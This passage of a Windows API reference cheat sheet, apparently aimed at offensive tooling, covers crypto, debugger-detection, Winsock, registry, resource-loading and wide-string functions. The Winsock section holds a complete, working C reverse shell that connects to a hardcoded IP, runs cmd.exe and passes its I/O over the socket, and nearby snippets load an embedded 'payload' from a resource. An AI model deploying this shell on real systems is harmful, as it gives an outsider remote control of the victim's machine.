  [in]                const BYTE                  *pbEncryptedBlob,
  [in]                DWORD                       cbEncryptedBlob,
  [out, optional]     BYTE                        *pbDecrypted,
  [in, out, optional] DWORD                       *pcbDecrypted,
  [out, optional]     PCCERT_CONTEXT              *ppXchgCert
); // The CryptDecryptMessage function decodes and decrypts a message.
</code></pre>
<p><a href="">CryptEncryptMessage</a></p>
<pre><code class="language-c">BOOL CryptEncryptMessage(
  [in]      PCRYPT_ENCRYPT_MESSAGE_PARA pEncryptPara,
  [in]      DWORD                       cRecipientCert,
  [in]      PCCERT_CONTEXT []           rgpRecipientCert,
  [in]      const BYTE                  *pbToBeEncrypted,
  [in]      DWORD                       cbToBeEncrypted,
  [out]     BYTE                        *pbEncryptedBlob,
  [in, out] DWORD                       *pcbEncryptedBlob
); // The CryptEncryptMessage function encrypts and encodes a message.
</code></pre>
<h3 id="debugging">Debugging</h3>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent">IsDebuggerPresent</a></p>
<pre><code class="language-c">BOOL IsDebuggerPresent(); // Determines whether the calling process is being debugged by a user-mode debugger.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-checkremotedebuggerpresent">CheckRemoteDebuggerPresent</a></p>
<pre><code class="language-c">BOOL CheckRemoteDebuggerPresent(
  [in]      HANDLE hProcess,
  [in, out] PBOOL  pbDebuggerPresent
); // Determines whether the specified process is being debugged.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-outputdebugstringa">OutputDebugStringA</a></p>
<pre><code class="language-c">void OutputDebugStringA(
  [in, optional] LPCSTR lpOutputString
); // Sends a string to the debugger for display.
</code></pre>
<h3 id="winsock">Winsock</h3>
<pre><code class="language-c">/*** Windows Reverse Shell
 * 
 *   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñÑ    ‚ñà  ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà     ‚ñà‚ñë ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñÑ   ‚ñà‚ñà‚ñÄ‚ñà‚ñà‚ñà   ‚ñÑ‚ñÑ‚ñÑ        ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñë ‚ñà‚ñà
 * ‚ñí‚ñà‚ñà    ‚ñí  ‚ñà‚ñà ‚ñÄ‚ñà   ‚ñà ‚ñí‚ñà‚ñà‚ñí  ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñë ‚ñà ‚ñë‚ñà‚ñë‚ñí‚ñà‚ñà‚ñÄ ‚ñÄ‚ñà  ‚ñì‚ñà‚ñà ‚ñí ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñÑ    ‚ñí‚ñà‚ñà    ‚ñí ‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñí
 * ‚ñë ‚ñì‚ñà‚ñà‚ñÑ   ‚ñì‚ñà‚ñà  ‚ñÄ‚ñà ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñë ‚ñà ‚ñë‚ñà ‚ñí‚ñì‚ñà    ‚ñÑ ‚ñì‚ñà‚ñà ‚ñë‚ñÑ‚ñà ‚ñí‚ñí‚ñà‚ñà  ‚ñÄ‚ñà‚ñÑ  ‚ñë ‚ñì‚ñà‚ñà‚ñÑ   ‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñà‚ñë
 *   ‚ñí   ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà‚ñí  ‚ñê‚ñå‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà   ‚ñà‚ñà‚ñë‚ñë‚ñà‚ñë ‚ñà ‚ñë‚ñà ‚ñí‚ñì‚ñì‚ñÑ ‚ñÑ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñÑ  ‚ñë‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà   ‚ñí   ‚ñà‚ñà‚ñí‚ñë‚ñì‚ñà ‚ñë‚ñà‚ñà
 * ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñà‚ñà‚ñë   ‚ñì‚ñà‚ñà‚ñë‚ñë ‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñë‚ñë‚ñà‚ñà‚ñí‚ñà‚ñà‚ñì ‚ñí ‚ñì‚ñà‚ñà‚ñà‚ñÄ ‚ñë‚ñë‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí ‚ñì‚ñà   ‚ñì‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñë‚ñì‚ñà‚ñí‚ñë‚ñà‚ñà‚ñì
 * ‚ñí ‚ñí‚ñì‚ñí ‚ñí ‚ñë‚ñë ‚ñí‚ñë   ‚ñí ‚ñí ‚ñë ‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë ‚ñë ‚ñì‚ñë‚ñí ‚ñí  ‚ñë ‚ñë‚ñí ‚ñí  ‚ñë‚ñë ‚ñí‚ñì ‚ñë‚ñí‚ñì‚ñë ‚ñí‚ñí   ‚ñì‚ñí‚ñà‚ñë‚ñí ‚ñí‚ñì‚ñí ‚ñí ‚ñë ‚ñí ‚ñë‚ñë‚ñí‚ñë‚ñí
 * ‚ñë ‚ñë‚ñí  ‚ñë ‚ñë‚ñë ‚ñë‚ñë   ‚ñë ‚ñí‚ñë  ‚ñë ‚ñí ‚ñí‚ñë   ‚ñí ‚ñë ‚ñë    ‚ñë  ‚ñí     ‚ñë‚ñí ‚ñë ‚ñí‚ñë  ‚ñí   ‚ñí‚ñí ‚ñë‚ñë ‚ñë‚ñí  ‚ñë ‚ñë ‚ñí ‚ñë‚ñí‚ñë ‚ñë
 * ‚ñë  ‚ñë  ‚ñë     ‚ñë   ‚ñë ‚ñë ‚ñë ‚ñë ‚ñë ‚ñí    ‚ñë   ‚ñë  ‚ñë          ‚ñë‚ñë   ‚ñë   ‚ñë   ‚ñí   ‚ñë  ‚ñë  ‚ñë   ‚ñë  ‚ñë‚ñë ‚ñë
 *       ‚ñë           ‚ñë     ‚ñë ‚ñë      ‚ñë    ‚ñë ‚ñë         ‚ñë           ‚ñë  ‚ñë      ‚ñë   ‚ñë  ‚ñë  ‚ñë
 *                                   Written by: snowcra5h@icloud.com (snowcra5h) 2023
 *
 * This program establishes a reverse shell via the Winsock2 library. It is
 * designed to establish a connection to a specified remote server, and execute commands
 * received from the server on the local machine, giving the server
 * control over the local machine.
 *
 * Compile command (using MinGW on Wine):
 * wine gcc.exe windows.c -o windows.exe -lws2_32
 *
 * This code is intended for educational and legitimate penetration testing purposes only.
 * Please use responsibly and ethically.
 *
 */

#include &lt;winsock2.h&gt;
#include &lt;ws2tcpip.h&gt;
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#include &lt;process.h&gt;

const char* const PORT = &quot;1337&quot;;
const char* const IP = &quot;10.37.129.2&quot;;

typedef struct {
    HANDLE hPipeRead;
    HANDLE hPipeWrite;
    SOCKET sock;
} ThreadParams;

DWORD WINAPI OutputThreadFunc(LPVOID data);
DWORD WINAPI InputThreadFunc(LPVOID data);
void CleanUp(HANDLE hInputWrite, HANDLE hInputRead, HANDLE hOutputWrite, HANDLE hOutputRead, PROCESS_INFORMATION processInfo, addrinfo* result, SOCKET sock);

int main(int argc, char** argv) {
    WSADATA wsaData;
    int err = WSAStartup(MAKEWORD(2, 2), &amp;wsaData);
    if (err != 0) {
        fprintf(stderr, &quot;WSAStartup failed: %d\n&quot;, err);
        return 1;
    }

    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);
    if (sock == INVALID_SOCKET) {
        fprintf(stderr, &quot;Socket function failed with error = %d\n&quot;, WSAGetLastError());
        WSACleanup();
        return 1;
    }

    struct addrinfo hints = { 0 };
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    struct addrinfo* result;
    err = getaddrinfo(IP, PORT, &amp;hints, &amp;result);
    if (err != 0) {
        fprintf(stderr, &quot;Failed to get address info: %d\n&quot;, err);
        CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock);
        return 1;
    }

    if (WSAConnect(sock, result-&gt;ai_addr, (int)result-&gt;ai_addrlen, NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        fprintf(stderr, &quot;Failed to connect.\n&quot;);
        CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock);
        return 1;
    }

    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hInputWrite, hOutputRead, hInputRead, hOutputWrite;
    if (!CreatePipe(&amp;hOutputRead, &amp;hOutputWrite, &amp;sa, 0) || !CreatePipe(&amp;hInputRead, &amp;hInputWrite, &amp;sa, 0)) {
        fprintf(stderr, &quot;Failed to create pipe.\n&quot;);
        CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock);
        return 1;
    }

    STARTUPINFO startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESTDHANDLES;
    startupInfo.hStdInput = hInputRead;
    startupInfo.hStdOutput = hOutputWrite;
    startupInfo.hStdError = hOutputWrite;
    PROCESS_INFORMATION processInfo;

    WCHAR cmd[] = L&quot;cmd.exe /k&quot;;
    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &amp;startupInfo, &amp;processInfo)) {
        fprintf(stderr, &quot;Failed to create process.\n&quot;);
        CleanUp(hInputWrite, hInputRead, hOutputWrite, hOutputRead, processInfo, result, sock);
        return 1;
    }

    CloseHandle(hInputRead);
    CloseHandle(hOutputWrite);
    CloseHandle(processInfo.hThread);
    ThreadParams outputParams = { hOutputRead, NULL, sock };
    ThreadParams inputParams = { NULL, hInputWrite, sock };
    HANDLE hThread[2];
    hThread[0] = CreateThread(NULL, 0, OutputThreadFunc, &amp;outputParams, 0, NULL);
    hThread[1] = CreateThread(NULL, 0, InputThreadFunc, &amp;inputParams, 0, NULL);

    WaitForMultipleObjects(2, hThread, TRUE, INFINITE);
    CleanUp(hInputWrite, NULL, NULL, hOutputRead, processInfo, result, sock);
    return 0;
}

void CleanUp(HANDLE hInputWrite, HANDLE hInputRead, HANDLE hOutputWrite, HANDLE hOutputRead, PROCESS_INFORMATION processInfo, addrinfo* result, SOCKET sock) {
    if (hInputWrite != NULL) CloseHandle(hInputWrite);
    if (hInputRead != NULL) CloseHandle(hInputRead);
    if (hOutputWrite != NULL) CloseHandle(hOutputWrite);
    if (hOutputRead != NULL) CloseHandle(hOutputRead);
    if (processInfo.hProcess != NULL) CloseHandle(processInfo.hProcess);
    if (processInfo.hThread != NULL) CloseHandle(processInfo.hThread);
    if (result != NULL) freeaddrinfo(result);
    if (sock != NULL) closesocket(sock);
    WSACleanup();
}

DWORD WINAPI OutputThreadFunc(LPVOID data) {
    ThreadParams* params = (ThreadParams*)data;
    char buffer[4096];
    DWORD bytesRead;
    while (ReadFile(params-&gt;hPipeRead, buffer, sizeof(buffer) - 1, &amp;bytesRead, NULL)) {
        buffer[bytesRead] = '\0';
        send(params-&gt;sock, buffer, bytesRead, 0);
    }
    return 0;
}

DWORD WINAPI InputThreadFunc(LPVOID data) {
    ThreadParams* params = (ThreadParams*)data;
    char buffer[4096];
    int bytesRead;
    while ((bytesRead = recv(params-&gt;sock, buffer, sizeof(buffer) - 1, 0)) &gt; 0) {
        DWORD bytesWritten;
        WriteFile(params-&gt;hPipeWrite, buffer, bytesRead, &amp;bytesWritten, NULL);
    }
    return 0;
}
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup">WSAStartup</a></p>
<pre><code class="language-c">int WSAStartup(
    WORD wVersionRequired, 
    LPWSADATA lpWSAData
); // Initializes the Winsock library for an application. Must be called before any other Winsock functions.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect">WSAConnect</a></p>
<pre><code class="language-c">int WSAConnect(
    SOCKET s, // Descriptor identifying a socket.
    const struct sockaddr* name, // Pointer to the sockaddr structure for the connection target.
    int namelen, // Length of the sockaddr structure.
    LPWSABUF lpCallerData, // Pointer to user data to be transferred during connection.
    LPWSABUF lpCalleeData, // Pointer to user data transferred back during connection.
    LPQOS lpSQOS, // Pointer to flow specs for socket s, one for each direction.
    LPQOS lpGQOS // Pointer to flow specs for the socket group.
); // Establishes a connection to another socket application.This function is similar to connect, but allows for more control over the connection process.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasend">WSASend</a></p>
<pre><code class="language-c">int WSASend(
    SOCKET s, // Descriptor identifying a connected socket.
    LPWSABUF lpBuffers, // Array of buffers for data to be sent.
    DWORD dwBufferCount, // Number of buffers in the lpBuffers array.
    LPDWORD lpNumberOfBytesSent, // Pointer to the number of bytes sent by this function call.
    DWORD dwFlags, // Flags to modify the behavior of the function call.
    LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations.
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the send operation has been completed.
); // Sends data on a connected socket.It can be used for both synchronous and asynchronous data transfer.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsarecv">WSARecv</a></p>
<pre><code class="language-c">int WSARecv(
    SOCKET s, // Descriptor identifying a connected socket.
    LPWSABUF lpBuffers, // Array of buffers to receive the incoming data.
    DWORD dwBufferCount, // Number of buffers in the lpBuffers array.
    LPDWORD lpNumberOfBytesRecvd, // Pointer to the number of bytes received by this function call.
    LPDWORD lpFlags, // Flags to modify the behavior of the function call.
    LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations.
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the receive operation has been completed.
); //Receives data from a connected socket, and can also be used for both synchronous and asynchronous data transfer.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasendto">WSASendTo</a></p>
<pre><code class="language-c">int WSASendTo(
    SOCKET s, // Descriptor identifying a socket.
    LPWSABUF lpBuffers, // Array of buffers containing the data to be sent.
    DWORD dwBufferCount, // Number of buffers in the lpBuffers array.
    LPDWORD lpNumberOfBytesSent, // Pointer to the number of bytes sent by this function call.
    DWORD dwFlags, // Flags to modify the behavior of the function call.
    const struct sockaddr* lpTo, // Pointer to the sockaddr structure for the target address.
    int iToLen, // Size of the address in lpTo.
    LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations.
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the send operation has been completed.
); // Sends data to a specific destination, for use with connection - less socket types such as SOCK_DGRAM.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsarecvfrom">WSARecvFrom</a></p>
<pre><code class="language-c">int WSARecvFrom(
    SOCKET s, // Descriptor identifying a socket.
    LPWSABUF lpBuffers, // Array of buffers to receive the incoming data.
    DWORD dwBufferCount, // Number of buffers in the lpBuffers array.
    LPDWORD lpNumberOfBytesRecvd, // Pointer to the number of bytes received by this function call.
    LPDWORD lpFlags, // Flags to modify the behavior of the function call.
    struct sockaddr* lpFrom, // Pointer to an address structure that will receive the source address upon completion of the operation.
    LPINT lpFromlen, // Pointer to the size of the lpFrom address structure.
    LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations.
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the receive operation has been completed.
); //Receives data from a specific source, used with connection - less socket types such as SOCK_DGRAM.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaasyncselect">WSAAsyncSelect</a></p>
<pre><code class="language-c">int WSAAsyncSelect(
    SOCKET s, // Descriptor identifying the socket.
    HWND hWnd, // Handle to the window which should receive the message.
    unsigned int wMsg, // Message to be received when an event occurs.
    long lEvent // Bitmask specifying a group of conditions to be monitored.
); // Requests Windows message - based notification of network events for a socket.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket">socket</a></p>
<pre><code class="language-c">SOCKET socket(
    int af, 
    int type, 
    int protocol
); // Creates a new socket for network communication.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind">bind</a></p>
<pre><code class="language-c">int bind(
    SOCKET s, 
    const struct sockaddr *name, 
    int namelen
); // Binds a socket to a specific local address and port.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-listen">listen</a></p>
<pre><code class="language-c">int listen(
    SOCKET s, 
    int backlog
); // Sets a socket to listen for incoming connections.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/Winsock2/nf-winsock2-accept">accept</a></p>
<pre><code class="language-c">SOCKET accept(
    SOCKET s, 
    struct sockaddr *addr, 
    int *addrlen
); // Accepts a new incoming connection on a listening socket.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect">connect</a></p>
<pre><code class="language-c">int connect(
    SOCKET s, 
    const struct sockaddr *name, 
    int namelen
); // Initiates a connection on a socket to a remote address.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send">send</a></p>
<pre><code class="language-c">int send(
    SOCKET s, 
    const char *buf, 
    int len, 
    int flags
); // Sends data on a connected socket.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-recv">recv</a></p>
<pre><code class="language-c">int recv(
    SOCKET s, 
    char *buf, 
    int len, 
    int flags
); // Receives data from a connected socket.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-closesocket">closesocket</a></p>
<pre><code class="language-c">int closesocket(
    SOCKET s
); //Closes a socket and frees its resources.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-gethostbyname">gethostbyname</a></p>
<pre><code class="language-c">hostent* gethostbyname(
    const char* name // either a hostname or an IPv4 address in dotted-decimal notation
); // returns a pointer to a hostent struct. NOTE: Typically better to use getaddrinfo
</code></pre>
<h3 id="registry-operations">Registry Operations</h3>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexw">RegOpenKeyExW</a></p>
<pre><code class="language-c">LONG RegOpenKeyExW(
    HKEY hKey, 
    LPCWTSTR lpSubKey, 
    DWORD ulOptions, 
    REGSAM samDesired, 
    PHKEY phkResult
); // Opens the specified registry key.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvaluew">RegQueryValueExW</a></p>
<pre><code class="language-c">LONG RegQueryValueExW(
    HKEY hKey, 
    LPCWTSTR lpValueName, 
    LPDWORD lpReserved, 
    LPDWORD lpType, 
    LPBYTE lpData, 
    LPDWORD lpcbData
); // Retrieves the type and data of the specified value name associated with an open registry key.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexw">RegSetValueExW</a></p>
<pre><code class="language-c">LONG RegSetValueEx(
    HKEY hKey, 
    LPCWTSTR lpValueName, 
    DWORD Reserved, 
    DWORD dwType, 
    const BYTE *lpData, 
    DWORD cbData
); // Sets the data and type of the specified value name associated with an open registry key.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey">RegCloseKey</a></p>
<pre><code class="language-c">LONG RegCloseKey(
    HKEY hKey
); // Closes a handle to the specified registry key.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa">RegCreateKeyExA</a></p>
<pre><code class="language-c">LSTATUS RegCreateKeyExA(
  [in]            HKEY                        hKey,
  [in]            LPCSTR                      lpSubKey,
                  DWORD                       Reserved,
  [in, optional]  LPSTR                       lpClass,
  [in]            DWORD                       dwOptions,
  [in]            REGSAM                      samDesired,
  [in, optional]  const LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  [out]           PHKEY                       phkResult,
  [out, optional] LPDWORD                     lpdwDisposition
); // Creates the specified registry key. If the key already exists, the function opens it. Note that key names are not case sensitive. 
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa">RegSetValueExA</a></p>
<pre><code class="language-c">LSTATUS RegSetValueExA(
  [in]           HKEY       hKey,
  [in, optional] LPCSTR     lpValueName,
                 DWORD      Reserved,
  [in]           DWORD      dwType,
  [in]           const BYTE *lpData,
  [in]           DWORD      cbData
); // Sets the data and type of a specified value under a registry key.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeya">RegCreateKeyA</a></p>
<pre><code class="language-c">LSTATUS RegCreateKeyA(
  [in]           HKEY   hKey,
  [in, optional] LPCSTR lpSubKey,
  [out]          PHKEY  phkResult
); // Creates the specified registry key. If the key already exists in the registry, the function opens it.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regdeletekeya">RegDeleteKeyA</a></p>
<pre><code class="language-c">LSTATUS RegDeleteKeyA(
  [in] HKEY   hKey,
  [in] LPCSTR lpSubKey
); // Deletes a subkey and its values. Note that key names are not case sensitive.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntrenamekey">NtRenameKey</a></p>
<pre><code class="language-c">__kernel_entry NTSTATUS NtRenameKey(
  [in] HANDLE          KeyHandle,
  [in] PUNICODE_STRING NewName
); // Changes the name of the specified registry key.
</code></pre>
<h3 id="error-handling">Error Handling</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsagetlasterror">WSAGetLastError</a></p>
<pre><code class="language-c">int WSAGetLastError(
    void
); // Returns the error status for the last Windows Sockets operation that failed.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsasetlasterror">WSASetLastError</a></p>
<pre><code class="language-c">void WSASetLastError(
    int iError
); // Sets the error status for the last Windows Sockets operation.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsagetoverlappedresult">WSAGetOverlappedResult</a></p>
<pre><code class="language-c">BOOL WSAGetOverlappedResult(
    SOCKET s, 
    LPWSAOVERLAPPED lpOverlapped, 
    LPDWORD lpcbTransfer, 
    BOOL fWait, 
    LPDWORD lpdwFlags
); // Determines the results of an overlapped operation on the specified socket.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaioctl">WSAIoctl</a></p>
<pre><code class="language-c">int WSAIoctl(
    SOCKET s, 
    DWORD dwIoControlCode, 
    LPVOID lpvInBuffer, 
    DWORD cbInBuffer, 
    LPVOID lpvOutBuffer, 
    DWORD cbOutBuffer, 
    LPDWORD lpcbBytesReturned, 
    LPWSAOVERLAPPED lpOverlapped, 
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
); // Controls the mode of a socket.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsacreateevent">WSACreateEvent</a></p>
<pre><code class="language-c">WSAEVENT WSACreateEvent(
    void
); // Creates a new event object.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasetevent">WSASetEvent</a></p>
<pre><code class="language-c">BOOL WSASetEvent(
    WSAEVENT hEvent
); // Sets the state of the specified event object to signaled.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaresetevent">WSAResetEvent</a></p>
<pre><code class="language-c">BOOL WSAResetEvent(
    WSAEVENT hEvent
); // Sets the state of the specified event object to nonsignaled.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsacloseevent">WSACloseEvent</a></p>
<pre><code class="language-c">BOOL WSACloseEvent(
    WSAEVENT hEvent
); // Closes an open event object handle.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsawaitformultipleevents">WSAWaitForMultipleEvents</a></p>
<pre><code class="language-c">DWORD WSAWaitForMultipleEvents(
    DWORD cEvents, 
    const WSAEVENT *lphEvents, 
    BOOL fWaitAll, 
    DWORD dwTimeout, 
    BOOL fAlertable
); // Waits for multiple event objects and returns when the specified events are signaled or the time-out interval elapses.
</code></pre>
<h3 id="resource-management">Resource Management</h3>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-findresourcea">FindResource</a></p>
<pre><code class="language-c">HRSRC FindResource(
  [in, optional] HMODULE hModule,   // A handle to the module whose portable executable file or an accompanying MUI file contains the resource. If this parameter is NULL, the function searches the module used to create the current process.
  [in]           LPCSTR  lpName,    // The name of the resource.
  [in]           LPCSTR  lpType     // The resource type.
); // Determines the location of a resource with the specified type and name in the specified module.
</code></pre>
<pre><code class="language-c">HRSRC res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource">LoadResource</a></p>
<pre><code class="language-c">HGLOBAL LoadResource(
  [in, optional] HMODULE hModule,    // A handle to the module whose executable file contains the resource. 
  [in]           HRSRC   hResInfo    // A handle to the resource to be loaded.
); // Retrieves a handle that can be used to obtain a pointer to the first byte of the specified resource in memory.
</code></pre>
<pre><code class="language-c">HGLOBAL resHandle = resHandle = LoadResource(NULL, res);
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource">LockResource</a></p>
<pre><code class="language-c">LPVOID LockResource(
  [in] HGLOBAL hResData    // A handle to the resource to be accessed
); // Retrieves a pointer to the specified resource in memory.
</code></pre>
<pre><code class="language-c">unsigned char * payload = (char *) LockResource(resHandle);
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource">SizeofResource</a></p>
<pre><code class="language-c">DWORD SizeofResource(
  [in, optional] HMODULE hModule,    // A handle to the module whose executable file contains the resource
  [in]           HRSRC   hResInfo    // A handle to the resource. This handle must be created by using FindResource
); // Retrieves the size, in bytes, of the specified resource.
</code></pre>
<pre><code class="language-c">unsigned int payload_len = SizeofResource(NULL, res);
</code></pre>
<hr />
<h2 id="unicode-string-functions">Unicode String Functions</h2>
<pre><code class="language-c">#include &lt;wchar.h&gt; // for wide character string routines
</code></pre>
<h3 id="string-length">String Length</h3>
<pre><code class="language-c">size_t wcslen(
    const wchar_t *str
); // Returns the length of the given wide string.
</code></pre>
<h3 id="string-copy">String Copy</h3>
<p>[wcscpy]</p>
<pre><code class="language-c">wchar_t *wcscpy(
    wchar_t *dest, 
    const wchar_t *src
); // Copies the wide string from src to dest.
</code></pre>
<p>[wcsncpy]</p>
<pre><code class="language-c">wchar_t *wcsncpy(
    wchar_t *dest, 
    const wchar_t *src, 
    size_t count
); // Copies at most count characters from the wide string src to dest.
</code></pre>
<h3 id="string-concatenation">String Concatenation</h3>
<p>[wcscat]</p>
<pre><code class="language-c">wchar_t *wcscat(
    wchar_t *dest, 
    const wchar_t *src
); // Appends the wide string src to the end of the wide string dest.
</code></pre>
<p>[wcsncat]</p>
<pre><code class="language-c">wchar_t *wcsncat(
    wchar_t *dest, 
    const wchar_t *src, 
    size_t count
); // Appends at most count characters from the wide string src to the end of the wide string dest.
</code></pre>
<h3 id="string-comparison">String Comparison</h3>
<p>[wcscmp]</p>
<pre><code class="language-c">int wcscmp(
    const wchar_t *str1, 
    const wchar_t *str2
); // Compares two wide strings lexicographically.
</code></pre>
<p>[wcsncmp]</p>
<pre><code class="language-c">int wcsncmp(
    const wchar_t *str1, 
    const wchar_t *str2, 
    size_t count
); // Compares up to count characters of two wide strings lexicographically.
</code></pre>
<p>[_wcsicmp]</p>
<pre><code class="language-c">int _wcsicmp(
    const wchar_t *str1, 
    const wchar_t *str2
); // Compares two wide strings lexicographically, ignoring case.
</code></pre>
<p>[_wcsnicmp]</p>
<pre><code class="language-c">int _wcsnicmp(
    const wchar_t *str1, 
    const wchar_t *str2, 
    size_t count
); // Compares up to count characters of two wide strings lexicographically, ignoring case.
</code></pre>
<h3 id="string-search">String Search</h3>
<p>[wcschr]</p>
<pre><code class="language-c">wchar_t *wcschr(
    const wchar_t *str, 
    wchar_t c
); // Finds the first occurrence of the wide character c in the wide string str.
</code></pre>
<p>[wcsrchr]</p>
<pre><code class="language-c">wchar_t *wcsrchr(
    const wchar_t *str, 
    wchar_t c
); // Finds the last occurrence of the wide character c in the wide string str.
</code></pre>
<p>[wcspbrk]</p>
<pre><code class="language-c">wchar_t *wcspbrk(
    const wchar_t *str1, 
    const wchar_t *str2
); // Finds the first occurrence in the wide string str1 of any character from the wide string str2.
</code></pre>
<p>[wcsstr]</p>
